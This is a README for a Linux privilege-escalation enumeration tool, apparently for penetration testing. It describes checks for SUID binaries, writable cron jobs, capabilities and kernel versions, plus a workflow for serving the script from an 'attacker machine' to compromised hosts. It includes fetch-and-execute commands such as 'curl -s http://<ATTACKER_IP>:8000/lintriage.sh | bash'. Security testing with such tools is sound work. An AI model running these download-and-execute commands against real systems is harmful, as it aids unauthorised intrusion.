# Lintriage

Linux Privilege Escalation Auto-Triage Tool

## Overview

Lintriage is a focused Linux privilege escalation enumeration tool that runs only the checks you care about, avoiding the noise of comprehensive tools like LinPEAS. It performs targeted checks for common privilege escalation vectors and presents findings in a clear HIGH/MEDIUM/INFO format.

## Features

### Enumeration Checks

Lintriage checks for:

- **SUID binaries** - Identifies setuid binaries, especially dangerous ones
- **Writable cron jobs** - Finds writable cron files and directories
- **Writable systemd services** - Detects writable systemd service files
- **Linux capabilities** - Checks for files with dangerous capabilities
- **Interesting files** - Searches for .bak, .old, .conf, and other potentially sensitive files
- **Kernel version** - Checks kernel version against known vulnerabilities

### User Interface

- **Sleek design** - Beautiful ASCII art header and clean box-drawing characters
- **Color-coded output** - Easy-to-read severity levels (HIGH/MEDIUM/INFO)
- **Progress indicators** - Real-time check status with visual feedback
- **Organized results** - Findings grouped by severity with clear formatting
- **Summary statistics** - Quick overview of findings at a glance

## Installation

```bash
# Clone the repository
git clone <repository-url>
cd Lintriage
```

## Usage

### Serving the Build (Attacker Machine)

On your attacker machine, use the Python script to serve the bash build:

```bash
# Start the build server (default port 8000)
python3 lintriage.py serve

# Or specify a custom port
python3 lintriage.py serve --port 8080
```

The server will display:
- Local and network URLs to download the script
- Ready-to-use `wget` and `curl` commands
- Instructions for making the script executable

### Downloading on Target Machine

Once the server is running, download the script on your target Linux machine:

**Using wget:**
```bash
wget http://<ATTACKER_IP>:8000/lintriage.sh -O lintriage.sh
chmod +x lintriage.sh
./lintriage.sh
```

**Using curl:**
```bash
curl http://<ATTACKER_IP>:8000/lintriage.sh -o lintriage.sh
chmod +x lintriage.sh
./lintriage.sh
```

**Alternative: Direct execution (one-liner):**
```bash
# Download and execute in one command
wget -qO- http://<ATTACKER_IP>:8000/lintriage.sh | bash

# Or with curl
curl -s http://<ATTACKER_IP>:8000/lintriage.sh | bash
```

### Running Locally (Linux Only)

If you're already on a Linux system, you can run the Python version directly:

```bash
# Run as regular user (some checks may be limited)
python3 lintriage.py

# Run as root for comprehensive checks
sudo python3 lintriage.py
```

**Note:** The bash script (`lintriage.sh`) in the `builds/` directory is designed for easy upload and execution on target Linux machines. It requires no Python or additional dependencies - just standard Linux utilities.

## Output Format

Lintriage organizes findings into three severity levels:

- **HIGH** - Critical findings that often lead to privilege escalation (red)
- **MEDIUM** - Potentially exploitable findings (yellow)
- **INFO** - Informational findings that may be useful (blue)

## Requirements

### For Serving (Attacker Machine)
- Python 3.6+
- Network access to target machine

### For Running (Target Machine)
- Bash shell
- Linux system
- Standard Linux utilities (find, getcap, uname, crontab, etc.)
- No Python or additional dependencies required

## Example Output

```
  ██      ██ ███    ██ ████████ ██████  ██  █████   ██████  ███████ 
  ██      ██ ████   ██    ██    ██   ██ ██ ██   ██ ██       ██      
  ██      ██ ██ ██  ██    ██    ██████  ██ ███████ ██   ███ █████   
  ██      ██ ██  ██ ██    ██    ██   ██ ██ ██   ██ ██    ██ ██      
  ███████ ██ ██   ████    ██    ██   ██ ██ ██   ██  ██████  ███████ 
                                                                                                                  
        Linux Privilege Escalation Auto-Triage Tool              
        Focused enumeration without the noise                    


✓ SUID binaries [completed]
✓ Writable cron jobs [completed]
✓ Writable systemd services [completed]
✓ Linux capabilities [completed]
✓ Interesting files [completed]
✓ Kernel version [completed]

┌────────────────────────────────────────────────────────────┐
│  ⚠  HIGH SEVERITY FINDINGS                                 │
└────────────────────────────────────────────────────────────┘

• [1] SUID Binary
   ➜ Dangerous SUID binary found: /usr/bin/find
   └─ Binary: find - Known to be exploitable

╔════════════════════════════════════════════════════════════╗
║                        SUMMARY                             ║
╠════════════════════════════════════════════════════════════╣
║  HIGH:   1  │  MEDIUM: 3  │  INFO:   5  │  TOTAL: 9        ║
╚════════════════════════════════════════════════════════════╝
```

## Project Structure

```
Lintriage/
├── lintriage.py          # Main Python script (run locally or serve builds)
├── builds/
│   └── lintriage.sh      # Bash script build (served to target machines)
├── README.md
└── LICENSE
```

## Workflow

1. **On attacker machine:** Run `python3 lintriage.py serve` to start the HTTP server
2. **On target machine:** Download the script using `wget` or `curl`
3. **On target machine:** Execute `./lintriage.sh` to run the enumeration

This workflow allows you to easily transfer and execute the tool on compromised Linux systems without needing to manually upload files or install dependencies.

## License

See LICENSE file for details.
